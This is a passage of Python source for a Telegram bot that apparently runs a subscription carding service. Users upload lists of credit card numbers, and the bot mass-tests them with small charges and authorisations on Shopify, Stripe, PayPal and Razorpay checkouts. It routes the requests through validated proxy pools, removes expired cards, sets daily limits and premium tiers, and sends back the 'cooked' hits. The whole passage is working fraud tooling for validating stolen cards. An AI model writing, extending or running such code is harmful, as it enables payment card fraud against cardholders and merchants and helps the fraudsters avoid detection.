                    hit_pref="both", dm_target_user_id=None
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.message_handler(commands=['mrz'])
    def handle_razor_mass_inline(message):
        import threading
        user_id = message.from_user.id
        chat_id = message.chat.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        if is_user_busy(user_id):
            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /mrz <card1> <card2> ... (max 10)", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid cards found.")
            return
        ccs = ccs[:10]
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.reply_to, message, "❌ No Razorpay sites. Add with /addrz.")
            return

        proxies = get_active_proxies(user_id, "razorpay")
        if not proxies:
            safe_send(bot.reply_to, message, "🚫 No Razorpay proxies. Use /cleanrzpro or add authenticated proxies.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.reply_to, message, "❌ All your Razorpay proxies are dead.")
            return
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
                return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.reply_to, message, "⚠️ Too many global checks running. Please wait.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, chat_id,
            f"💎 <b>Razorpay Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies\n🛡️ {len(sites)} Sites",
            parse_mode='HTML')
        def mass_thread():
            try:
                process_razorpay_mass_check(
                    bot, message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.message_handler(commands=['mchk'])
    def handle_stripe_auth_mass(message):
        import threading
        user_id = message.from_user.id
        chat_id = message.chat.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        if is_user_busy(user_id):
            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /mchk <card1> <card2> ... (max 10)", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid cards found.")
            return
        ccs = ccs[:10]

        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.reply_to, message, "🚫 No Shopify proxies. Add via /addpro.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
            return
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
                return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, chat_id,
            f"🔐 <b>Stripe Auth Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        def mass_thread():
            try:
                process_gate_mass_check(
                    bot, message, start_msg, ccs, check_stripe_auth, "Stripe Auth",
                    active_proxies, user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.message_handler(commands=['msc'])
    def handle_stripe_charge_mass(message):
        import threading
        user_id = message.from_user.id
        chat_id = message.chat.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        if is_user_busy(user_id):
            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /msc <card1> <card2> ... (max 10)", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid cards found.")
            return
        ccs = ccs[:10]

        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.reply_to, message, "🚫 No Shopify proxies.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
            return
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
                return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, chat_id,
            f"💸 <b>Stripe Charge Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        def mass_thread():
            try:
                process_gate_mass_check(
                    bot, message, start_msg, ccs, check_stripe5, "Stripe $5 Charge",
                    active_proxies, user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.message_handler(commands=['mpp'])
    def handle_paypal_mass(message):
        import threading
        user_id = message.from_user.id
        chat_id = message.chat.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        if is_user_busy(user_id):
            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /mpp <card1> <card2> ... (max 10)", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid cards found.")
            return
        ccs = ccs[:10]

        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.reply_to, message, "🚫 No Shopify proxies.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
            return
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
                return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, chat_id,
            f"💵 <b>PayPal Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        def mass_thread():
            try:
                process_gate_mass_check(
                    bot, message, start_msg, ccs, check_paypal_charge, "PayPal $1 Charge",
                    active_proxies, user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    # ====================================================================
    # FILE HANDLER – for CC uploads, proxy uploads, etc.
    # ====================================================================
    @bot.message_handler(content_types=['document'])
    def unified_file_handler(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        is_free_group = (chat_id == FREE_GROUP_ID)

        # ─────────────────────────────────────────────
        # Branch 1 — Razorpay sites file
        # ─────────────────────────────────────────────
        if user_sessions.get(user_id, {}).get('awaiting_rz_file'):
            user_sessions[user_id]['awaiting_rz_file'] = False
            try:
                file_name = message.document.file_name.lower()
                if not file_name.endswith('.txt'):
                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.", parse_mode='HTML')
                    return
                msg_loading = safe_send(bot.reply_to, message, "⏳ Processing Razorpay sites...", parse_mode='HTML')
                file_info = bot.get_file(message.document.file_id)
                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
                lines = [line.strip() for line in file_content.split('\n') if line.strip()]
                added = 0
                invalid = []
                sites = load_rz_sites()
                for line in lines:
                    if not is_valid_razorpay_url(line):
                        invalid.append(line)
                        continue
                    if line in sites:
                        continue
                    valid, _ = validate_razorpay_site(line)
                    if not valid:
                        invalid.append(line)
                        continue
                    sites.append(line)
                    added += 1
                save_rz_sites(sites)
                result = f"✅ Added {added} new Razorpay sites.\nTotal sites: {len(sites)}"
                if invalid:
                    result += f"\n⚠️ Skipped {len(invalid)} invalid lines."
                if msg_loading:
                    safe_send(bot.edit_message_text, result, message.chat.id, msg_loading.message_id, parse_mode='HTML')
                else:
                    safe_send(bot.send_message, message.chat.id, result, parse_mode='HTML')
            except Exception as e:
                logger.error(f"RZ file upload error: {e}")
                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
            return

        # ─────────────────────────────────────────────
        # Branch 2 — Proxy file (2-stage fast test)
        # ─────────────────────────────────────────────
        if user_sessions.get(user_id, {}).get('awaiting_proxy_file'):
            try:
                file_name = message.document.file_name.lower()
                if not file_name.endswith('.txt'):
                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                    return

                msg_loading = safe_send(bot.reply_to, message, "⏳ Reading proxies...", parse_mode='HTML')

                file_info = bot.get_file(message.document.file_id)
                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

                # ── Normalize every line ──
                raw = []
                for line in file_content.split('\n'):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    n = normalize_proxy(line)
                    if n:
                        raw.append(n)
                raw_proxies = list(set(raw))

                if not raw_proxies:
                    safe_send(bot.edit_message_text, "❌ No valid proxies found.",
                              message.chat.id, msg_loading.message_id)
                    return

                total = len(raw_proxies)

                safe_send(bot.edit_message_text,
                          f"⚡ Testing {total} proxies...\n"
                          f"Stage 1/2 — fast connectivity filter\n"
                          f"Stage 2/2 — Shopify + Razorpay check",
                          message.chat.id, msg_loading.message_id)

                # ─────────────────────────────────────────
                # Stage 1 — fast connectivity (5s, 150 workers)
                # Uses ipify.org which responds in <1s
                # ─────────────────────────────────────────
                alive = []
                lock = threading.Lock()
                checked1 = [0]

                def _stage1(p):
                    ok = _quick_alive(p, timeout=5)
                    with lock:
                        checked1[0] += 1
                        n = checked1[0]
                        if ok:
                            alive.append(p)
                    # Report every 25 proxies or on last one
                    if n % 25 == 0 or n == total:
                        try:
                            pct = int((n / total) * 100)
                            safe_send(bot.edit_message_text,
                                      f"⚡ <b>Stage 1/2</b> — {pct}%\n"
                                      f"Progress: {n}/{total}\n"
                                      f"✅ Alive: <b>{len(alive)}</b>\n"
                                      f"❌ Dead: <b>{n - len(alive)}</b>",
                                      message.chat.id, msg_loading.message_id,
                                      parse_mode='HTML')
                        except Exception:
                            pass
                    return ok

                with ThreadPoolExecutor(max_workers=200) as ex:
                    list(ex.map(_stage1, raw_proxies)) 

                if not alive:
                    safe_send(bot.edit_message_text,
                              f"✅ <b>Import complete</b>\n\n"
                              f"📦 Uploaded: {total}\n"
                              f"🌐 Alive: 0\n\n"
                              f"<i>All dead or blocked.</i>",
                              message.chat.id, msg_loading.message_id,
                              parse_mode='HTML')
                    return

                safe_send(bot.edit_message_text,
                          f"✅ <b>Stage 1 done</b> — {len(alive)}/{total} alive.\n\n"
                          f"⚡ <b>Stage 2/2</b> — Shopify quality check...",
                          message.chat.id, msg_loading.message_id,
                          parse_mode='HTML')

                # ─────────────────────────────────────────
                # Stage 2 — Shopify quality check on survivors
                # (30 workers — matches API capacity)
                # ─────────────────────────────────────────
                shopify_live = []
                razorpay_live = []
                checked2 = [0]
                total2 = len(alive)

                def _stage2(p):
                    s_ok = _hard_cap(test_proxy_for_shopify, p, timeout=60, default=False)
                    r_ok = False
                    if len(p.split(':')) == 4:
                        r_ok = _hard_cap(test_proxy_for_razorpay, p, timeout=30, default=False)
                    with lock:
                        checked2[0] += 1
                        n = checked2[0]
                        if s_ok:
                            shopify_live.append(p)
                            add_proxy_to_user(user_id, p, "shopify")
                            add_global_proxy(p, "shopify")
                        if r_ok:
                            razorpay_live.append(p)
                            add_proxy_to_user(user_id, p, "razorpay")
                            add_global_proxy(p, "razorpay")
                    # Report every 5 proxies or on last one
                    if n % 5 == 0 or n == total2:
                        try:
                            pct = int((n / total2) * 100)
                            safe_send(bot.edit_message_text,
                                      f"⚡ <b>Stage 2/2</b> — {pct}%\n"
                                      f"Progress: {n}/{total2}\n"
                                      f"🛍️ Shopify: <b>{len(shopify_live)}</b>\n"
                                      f"💎 Razorpay: <b>{len(razorpay_live)}</b>",
                                      message.chat.id, msg_loading.message_id,
                                      parse_mode='HTML')
                        except Exception:
                            pass
                    return s_ok

                with ThreadPoolExecutor(max_workers=30) as ex:
                    list(ex.map(_stage2, alive))

                final_msg = (
                    f"✅ <b>Proxy import complete</b>\n\n"
                    f"📦 Uploaded: <b>{total}</b>\n"
                    f"🌐 Alive: <b>{len(alive)}</b>\n"
                    f"🛍️ Shopify Live: <b>{len(shopify_live)}</b>\n"
                    f"💎 Razorpay Live: <b>{len(razorpay_live)}</b>\n\n"
                    f"⚙️ Use /cleanshpro and /cleanrzpro to refresh later."
                )
                safe_send(bot.edit_message_text, final_msg,
                          message.chat.id, msg_loading.message_id,
                          parse_mode='HTML')

            except Exception as e:
                logger.error(f"Proxy upload error: {e}")
                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
            finally:
                user_sessions[user_id].pop('awaiting_proxy_file', None)
            return

        # ─────────────────────────────────────────────
        # Branch 3 — CC file (mass check)
        # ─────────────────────────────────────────────
        if not is_free_group and not is_user_allowed(user_id):
            access_denied(message, "You need an active subscription to upload files.")
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                return
            msg_loading = safe_send(bot.reply_to, message, "⏳ Reading File & Removing Expired Cards...", parse_mode='HTML')
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            raw_ccs = extract_cards_from_text(file_content)
            ccs = remove_expired_cards(raw_ccs)

            removed_expired = len(raw_ccs) - len(ccs)
            if removed_expired > 0:
                safe_send(bot.send_message, message.chat.id, f"🧹 Auto-removed {removed_expired} mathematically expired cards.")

            if not ccs:
                if msg_loading:
                    safe_send(bot.edit_message_text, "❌ No valid/unexpired CCs found in file.", message.chat.id, msg_loading.message_id)
                else:
                    safe_send(bot.send_message, message.chat.id, "❌ No valid/unexpired CCs found in file.")
                return

            if is_free_group:
                max_cards = 300
                if len(ccs) > max_cards:
                    ccs = ccs[:max_cards]
                    if msg_loading:
                        safe_send(bot.edit_message_text,
                            f"⚠️ Free group limit is {max_cards} cards. Only first {max_cards} will be checked.",
                            message.chat.id, msg_loading.message_id, parse_mode='HTML')
                    time.sleep(2)
            else:
                limit = get_user_upload_limit(user_id, load_json_func, users_file)
                if len(ccs) > limit and user_id not in OWNER_ID:
                    if msg_loading:
                        safe_send(bot.edit_message_text,
                            f"⚠️ Limit exceeded. Only first {limit} cards will be checked.",
                            message.chat.id, msg_loading.message_id, parse_mode='HTML')
                    ccs = ccs[:limit]
                    time.sleep(2)

            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['ccs'] = ccs
            user_sessions[user_id]['rz_ccs'] = ccs
            user_sessions[user_id]['send_results_to_dm'] = is_free_group

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🛍️ Shopify", callback_data="run_mass_shopify"),
                types.InlineKeyboardButton("🛍️ My Sites", callback_data="run_mass_mysites")
            )
            markup.add(
                types.InlineKeyboardButton("💸 Stripe $5 Charge", callback_data="run_mass_stripe5"),
                types.InlineKeyboardButton("🔐 Stripe Auth", callback_data="run_mass_stripeauth")
            )
            markup.add(
                types.InlineKeyboardButton("💵 PayPal $1 Charge", callback_data="run_mass_paypal")
            )
            if not is_free_group:
                markup.add(types.InlineKeyboardButton("💎 Razorpay ₹1", callback_data="run_mass_razorpay"))
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel"))

            menu_text = f"📂 <b>File:</b> <code>{file_name}</code>\n💳 <b>Cards to check:</b> {len(ccs)}\n<b>⚡ Select Option:</b>"
            if msg_loading:
                safe_send(bot.edit_message_text, menu_text,
                    message.chat.id, msg_loading.message_id,
                    reply_markup=markup, parse_mode='HTML')
            else:
                safe_send(bot.send_message, message.chat.id, menu_text,
                    reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            logger.error(f"File upload error: {e}")
            safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")

    # ====================================================================
    # CALLBACKS – for mass check buttons
    # ====================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass
        user_data = user_sessions.get(user_id, {})
        if not user_data or 'ccs' not in user_data:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
            return
        ccs = user_data['ccs']
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.send_message, call.message.chat.id, f"❌ Daily limit exceeded.")
                return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_pref_cooked"),
            types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="shopify_pref_both")
        )
        safe_send(bot.send_message, call.message.chat.id,
            "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\nChoose what results to receive:",
            parse_mode='HTML', reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_pref_"))
    def shopify_pref_callback(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        pref = call.data.replace("shopify_pref_", "")
        user_data = user_sessions.get(user_id, {})
        if not user_data or 'ccs' not in user_data:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ No cards found. Upload a file first.")
            return
        ccs = user_data['ccs']
        send_to_dm = user_data.get('send_results_to_dm', False)
        dm_user = user_id if send_to_dm else None

        sites = get_filtered_sites_func()
        if not sites:
            safe_send(bot.send_message, call.message.chat.id, "❌ No sites available!")
            return
        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 No Shopify proxies. Use /cleanshpro to refresh.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All Shopify proxies dead.")
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"🔥 <b>Starting Shopify Multi‑Site...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_shopify_mass_check(
                    bot, call.message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file, pref, dm_user
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_mysites")
    def callback_mysites(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        user_sites = get_user_sites(user_id)
        if not user_sites:
            safe_send(bot.send_message, call.message.chat.id, "You have no personal sites. Add with /addmysite.")
            return
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]['personal_sites'] = user_sites
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔥 Cooked Only", callback_data="mysites_pref_cooked"),
            types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="mysites_pref_both")
        )
        safe_send(bot.send_message, call.message.chat.id,
            "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\nUsing your personal sites.",
            parse_mode='HTML', reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("mysites_pref_"))
    def mysites_pref_callback(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        pref = call.data.replace("mysites_pref_", "")
        user_data = user_sessions.get(user_id, {})
        if not user_data or 'ccs' not in user_data:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ No cards found. Upload a file first.")
            return
        ccs = user_data['ccs']
        send_to_dm = user_data.get('send_results_to_dm', False)
        dm_user = user_id if send_to_dm else None

        user_sites = user_data.get('personal_sites', [])
        if not user_sites:
            safe_send(bot.send_message, call.message.chat.id, "No personal sites found.")
            return
        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 No Shopify proxies.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All Shopify proxies dead.")
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"🔥 <b>Starting Personal Sites Check...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_shopify_mass_check(
                    bot, call.message, start_msg, ccs, user_sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file, pref, dm_user
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_razorpay")
    def callback_razorpay_mass(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass
        user_data = user_sessions.get(user_id, {})
        if not user_data or 'ccs' not in user_data:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
            return
        ccs = user_data['ccs']
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.send_message, call.message.chat.id, "❌ No Razorpay sites. Use /addrz to add.")
            return
        proxies = get_active_proxies(user_id, "razorpay")
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 No Razorpay proxies. Use /cleanrzpro.")
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All Razorpay proxies dead.")
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"💎 <b>Razorpay Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}\n🛡️ Sites: {len(sites)}",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_razorpay_mass_check(
                    bot, call.message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    # Stripe/PayPal mass callbacks
    gate_map = {
        "stripe5": (check_stripe5, "Stripe $5 Charge"),
        "stripeauth": (check_stripe_auth, "Stripe Auth"),
        "paypal": (check_paypal_charge, "PayPal $1 Charge"),
    }

    for gate_key, (gate_func, gate_name) in gate_map.items():
        @bot.callback_query_handler(func=lambda call, gk=gate_key, gf=gate_func, gn=gate_name: call.data == f"run_mass_{gk}")
        def gate_callback(call, gate_key=gate_key, gate_func=gate_func, gate_name=gate_name):
            try:
                bot.answer_callback_query(call.id)
            except:
                pass
            user_id = call.from_user.id
            if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
                return
            try:
                safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
            except:
                pass
            user_data = user_sessions.get(user_id, {})
            if not user_data or 'ccs' not in user_data:
                safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
                return
            ccs = user_data['ccs']
            if user_id not in OWNER_ID:
                remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
                if remaining < len(ccs):
                    safe_send(bot.send_message, call.message.chat.id, f"❌ Daily limit exceeded.")
                    return
                fresh_users_data = load_json_func(users_file, {})
                user_info = fresh_users_data.get(str(user_id), {})
                user_limit = user_info.get('limit', 200)  # default if not set
                if len(ccs) > user_limit:
                    ccs = ccs[:user_limit]
                    safe_send(bot.send_message, call.message.chat.id,
                        f"⚠️ Limit for this gate is {user_limit} cards. Truncated.", parse_mode='HTML')
            proxies = get_active_proxies(user_id, "shopify")
            if not proxies:
                safe_send(bot.send_message, call.message.chat.id, "🚫 No Shopify proxies. Use /cleanshpro.")
                return
            active_proxies = validate_proxies_strict(proxies, bot, call.message)
            if not active_proxies:
                safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.")
                return
            if is_user_busy(user_id):
                safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy.")
                return
            if not mass_check_semaphore.acquire(blocking=False):
                safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
                return
            set_user_busy(user_id, True)
            send_to_dm = user_data.get('send_results_to_dm', False)
            dm_user = user_id if send_to_dm else None
            start_msg = safe_send(bot.send_message, call.message.chat.id,
                f"⚡ <b>{gate_name} Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}",
                parse_mode='HTML')
            import threading
            def mass_thread():
                try:
                    process_gate_mass_check(
                        bot, call.message, start_msg, ccs, gate_func, gate_name,
                        active_proxies, user_id, load_json_func, save_json_func, users_file, dm_user
                    )
                finally:
                    mass_check_semaphore.release()
                    set_user_busy(user_id, False)
            threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass

    # ====================================================================
    # Return utilities
    # ====================================================================
    return {
        'get_user_sites': get_user_sites,
        'save_user_sites_list': save_user_sites_list,
        'set_user_busy': set_user_busy,
        'is_user_busy': is_user_busy,
        'set_stop': set_stop,
        'clear_stop': clear_stop,
        'is_stop_requested': is_stop_requested,
        'mass_check_semaphore': mass_check_semaphore,
        'handle_clean_my_proxies': handle_clean_shopify_proxies,
        'get_active_proxies': get_active_proxies,
        'add_proxy_to_user': add_proxy_to_user,
        'add_global_proxy': add_global_proxy,
    }
